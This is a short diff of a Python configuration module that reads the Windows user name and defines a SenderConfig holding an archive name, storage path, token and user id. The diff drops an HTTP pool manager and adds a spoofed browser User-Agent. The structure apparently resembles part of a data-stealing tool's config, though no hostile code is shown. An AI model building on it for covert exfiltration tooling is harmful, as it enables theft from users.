@@ -1,12 +1,10 @@
 from os import environ
 from dataclasses import dataclass
 
-from urllib3 import poolmanager
 from win32api import GetUserName
 
 
 user = GetUserName()
-http = poolmanager.PoolManager(timeout=5.0)
 
 
 @dataclass
@@ -80,6 +78,7 @@ class SystemConfig:
 class SenderConfig:
 
     Variables: tuple = ("zip_name", "storage_path", "storage_folder", "token", "user_id", "errors")
+    UserAgent: str = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
 
 
 @dataclass
